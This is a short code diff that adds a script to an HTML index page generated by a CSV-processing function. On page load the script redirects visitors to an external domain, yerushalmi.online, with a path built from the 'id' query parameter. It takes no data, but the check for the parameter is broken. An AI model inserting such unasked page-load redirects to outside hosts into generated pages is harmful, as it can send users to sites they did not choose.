@@ -152,6 +152,12 @@ function processCsv() {
                     <title>Index</title>
                 </head>
                 <body>
+                <script>
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const id = urlParams.get('id');
+                    const redirectUrl = id.split('.').join('');
+                    if (id.length > 0) window.location.href = 'https://yerushalmi.online/' + redirectUrl + '.html';
+                </script>
                     <table border="1">
                         <tr>
                             <th>Index</th>
